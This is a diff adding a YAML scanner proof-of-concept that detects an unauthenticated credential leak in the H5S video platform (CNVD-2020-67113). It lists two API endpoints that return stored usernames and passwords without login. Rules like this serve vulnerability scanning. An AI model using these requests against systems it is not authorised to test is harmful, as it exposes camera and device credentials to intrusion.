@@ -1,0 +1,16 @@
+name: poc-yaml-h5s-video-platform-cnvd-2020-67113-unauth
+groups:
+  h5s1:
+   - method: GET
+     path: /api/v1/GetSrc
+     expression: response.status == 200 && response.content_type.contains("json") && response.body.bcontains(b"H5_AUTO") && response.body.bcontains(b"strUser") && response.body.bcontains(b"strPasswd")
+  h5s2:
+   - method: GET
+     path: /api/v1/GetDevice
+     expression: response.status == 200 && response.content_type.contains("json") && response.body.bcontains(b"H5_DEV") && response.body.bcontains(b"strUser") && response.body.bcontains(b"strPasswd")
+expression: h5s1() || h5s2()
+detail:
+  author: iak3ec(https://github.com/nu0l)
+  payload: /#/Dashboard | /#/Settings/Camera
+  links:
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2020-67113
